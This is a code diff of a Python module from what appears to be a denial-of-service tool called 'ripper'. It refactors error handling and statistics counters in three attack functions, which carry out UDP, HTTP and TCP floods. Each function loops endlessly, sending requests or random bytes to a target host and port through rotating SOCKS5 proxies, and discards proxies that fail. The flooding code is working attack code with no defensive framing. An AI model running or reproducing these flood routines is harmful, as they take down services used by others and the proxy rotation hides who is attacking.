@@ -1,15 +1,12 @@
-import re
 import socket
 import socks
-import time
 import random
-import urllib.request
 import threading
 from os import urandom as randbytes
 import ripper.services
-from ripper.context import Context
-from ripper.statistics import show_statistics
-from ripper.common import get_random_string, get_server_ip_error_msg
+from ripper.constants import *
+from ripper.context import Context, Errors, ErrorCodes
+from ripper.common import get_random_string
 from ripper.proxy import Sock5Proxy
 from ripper.urllib_x import build_request_http_package, http_request
 
@@ -20,8 +17,6 @@ lock = threading.Lock()
 ###############################################
 
 # TODO add support for http_method, http_path
-
-
 def build_ctx_request_http_package(_ctx: Context, is_accept_header_only: bool = True) -> str:
     local_headers = _ctx.headers
     if is_accept_header_only:
@@ -58,8 +53,8 @@ def delete_proxy(_ctx: Context, proxy: Sock5Proxy):
 ###############################################
 # Attack methods
 ###############################################
-
-def down_it_udp(_ctx: Context):
+def down_it_udp(_ctx: Context) -> None:
+    """UDP flood method."""
     i = 1
     proxy = None
     while True:
@@ -75,51 +70,47 @@ def down_it_udp(_ctx: Context):
         try:
             sock.sendto(request_packet, (_ctx.host_ip, _ctx.port))
         except socket.gaierror:
-            if get_server_ip_error_msg not in _ctx.errors:
-                _ctx.errors.append(str(get_server_ip_error_msg))
+            _ctx.add_error(Errors(ErrorCodes.CannotGetServerIP.value, GETTING_SERVER_IP_ERROR_MSG))
         except:
             _ctx.sock_manager.close_udp_socket(proxy)
         else:
-            if get_server_ip_error_msg in _ctx.errors:
-                _ctx.errors.remove(str(get_server_ip_error_msg))
-            _ctx.packets_sent += 1
+            _ctx.Statistic.packets.total_sent += 1
+            _ctx.Statistic.packets.sync_packets_sent()
+            _ctx.Statistic.packets.total_sent_bytes += len(request_packet)
+            _ctx.remove_error(ErrorCodes.CannotGetServerIP.value)
 
         i += 1
         if i == 100:
             i = 1
-            if not _ctx.connecting_host:
-                threading.Thread(
-                    daemon=True, target=ripper.services.connect_host, args=[_ctx]).start()
+            if not _ctx.Statistic.connect.in_progress:
+                threading.Thread(daemon=True, target=ripper.services.connect_host, args=[_ctx]).start()
                 # ripper.services.connect_host(_ctx)
 
-        if not _ctx.show_statistics:
-            show_statistics(_ctx)
 
-
-def down_it_http(_ctx: Context):
-    """HTTP flood."""
+def down_it_http(_ctx: Context) -> None:
+    """HTTP flood method."""
     proxy = None
     while True:
         if proxy is None:
             proxy = random_proxy_from_context(_ctx)
+
         try:
             response = http_request(
-                url=_ctx.url, proxy=proxy, http_method=_ctx.http_method)
-            _ctx.http_codes_counter[response.status] += 1
-            _ctx.connections_success += 1
+                url=_ctx.get_target_url(), proxy=proxy, http_method=_ctx.http_method)
+            _ctx.Statistic.http_stats[response.status] += 1
+            _ctx.Statistic.connect.success += 1
         except socks.ProxyError:
             delete_proxy(_ctx, proxy)
             proxy = None
         except:
-            _ctx.connections_failed += 1
+            _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
+            _ctx.Statistic.connect.failed += 1
 
-        _ctx.packets_sent += 1
-        if not _ctx.show_statistics:
-            show_statistics(_ctx)
+        _ctx.Statistic.packets.total_sent += 1
 
 
-def down_it_tcp(_ctx: Context):
-    """TCP flood."""
+def down_it_tcp(_ctx: Context) -> None:
+    """TCP flood method."""
     proxy = None
     while True:
         if proxy is None:
@@ -127,24 +118,20 @@ def down_it_tcp(_ctx: Context):
         try:
             sock = _ctx.sock_manager.create_tcp_socket(proxy)
             sock.connect((_ctx.host_ip, _ctx.port))
-            _ctx.connections_success += 1
+            _ctx.Statistic.connect.success += 1
             while True:
                 try:
-                    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
                     bytes_to_send = randbytes(_ctx.max_random_packet_len)
                     sock.send(bytes_to_send)
+                    _ctx.Statistic.packets.total_sent_bytes += _ctx.max_random_packet_len
+                    _ctx.Statistic.packets.total_sent += 1
                 except:
+                    _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
+                    _ctx.Statistic.connect.failed += 1
                     sock.close()
                     break
-                else:
-                    _ctx.packets_sent += bytes_to_send_len
-                    if not _ctx.show_statistics:
-                        show_statistics(_ctx)
         except socks.ProxyError:
             delete_proxy(_ctx, proxy)
             proxy = None
         except:
-            _ctx.connections_failed += 1
-
-        if not _ctx.show_statistics:
-            show_statistics(_ctx)
+            _ctx.Statistic.connect.failed += 1
